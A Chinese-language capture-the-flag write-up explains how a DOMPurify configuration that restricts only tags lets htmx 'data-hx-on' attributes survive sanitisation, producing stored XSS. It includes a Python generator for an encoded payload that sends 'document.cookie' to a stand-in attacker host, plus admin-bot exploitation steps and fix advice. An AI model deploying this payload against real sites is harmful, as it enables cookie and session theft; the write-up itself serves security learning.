# L3akCTF 2024 I'm No Longer the CEO Writeup

## 题目简述

这一版尝试修复前题：独立查看页加载了 DOMPurify，笔记 API 也要求 `HX-Request: true`。但笔记内容仍是未转义的 `template.HTML`，清洗配置只限制允许的标签，没有限制 `data-*` 属性。

htmx 会在 DOMPurify 清洗完成、响应插入 DOM 后继续解释这些属性。攻击者可以使用允许的 `<div>`，在其 `data-hx-on::*` 属性中保留脚本，形成存储型 XSS。

## 解题过程

### 分析失败的修复

前端在 `htmx:beforeSwap` 中处理目标 ID 以 `note` 开头的响应：

```javascript
const ALLOWED_TAGS = [
    "a", "b", "i", "u", "strong", "em", "p",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "br", "span", "div"
];

htmx.on("htmx:beforeSwap", (event) => {
    if (event.detail.target.id.startsWith("note")) {
        event.detail.serverResponse = DOMPurify.sanitize(
            event.detail.serverResponse,
            {ALLOWED_TAGS: ALLOWED_TAGS}
        );
    }
});
```

查看页的目标是 `#notes-container`，确实会进入该分支。然而配置只设置 `ALLOWED_TAGS`。DOMPurify 默认允许普通 `data-*` 属性，因此以下属性不会被删除：

```text
data-hx-get
data-hx-trigger
data-hx-on::after-request
```

清洗发生在 htmx swap 之前；swap 完成后，htmx 会初始化新节点并把这些属性当成行为指令。

服务端新增的 `HX-Request` 检查也无法阻止利用，因为查看页本来就是通过 htmx 发起请求，浏览器会自动附带该请求头：

```go
if r.Header.Get("HX-Request") != "true" {
    http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
    return
}
```

### 构造属性型载荷

使用允许的 `<div>`，让 htmx 每 5 秒请求一次站内首页，并在 `after-request` 事件中解码执行回连代码：

```python
import base64

javascript = (
    'navigator.sendBeacon('
    '"https://attacker.example/collect",'
    'document.cookie'
    ')'
)

encoded = base64.b64encode(
    javascript.encode()
).decode()

payload = (
    '<div '
    'data-hx-get="/" '
    'data-hx-trigger="every 5s" '
    'data-hx-on::after-request='
    f'"eval(atob(\'{encoded}\'))">'
    '</div>'
)

assert len(payload) <= 256
print(payload)
```

利用步骤如下：

1. 注册、登录并把 payload 保存为笔记；使用原生请求时要添加 `HX-Request: true`。
2. 记录响应 `HX-Redirect` 中的 `/view/<uuid>`。
3. 把该站内 URL 提交给 Admin Bot。
4. Bot 先设置可读的 `flag` Cookie，再访问查看页。
5. DOMPurify保留 `<div>` 和 `data-hx-*` 属性，htmx随后执行 `after-request` 代码，将 `document.cookie` 发到授权接收端。

最终得到：

```text
L3AK{im_actually_never_touching_htmx_and_go_again}
```

## 方法总结

- HTML 清洗必须同时约束标签和属性。允许 `data-*` 在普通页面可能无害，但在 htmx 页面中会变成声明式脚本执行面。
- 安全性取决于完整处理顺序：DOMPurify 先清洗字符串，htmx 再解释保留下来的属性，两者单独看都容易误判。
- `HX-Request` 只是客户端行为标记，不是认证或安全边界；真实 htmx 请求和攻击者都能设置它。
- 更可靠的修复是保持 Go 模板自动转义，并显式禁止 `data-hx-*`、`hx-*` 及所有事件型属性，而不是继续信任 `template.HTML`。
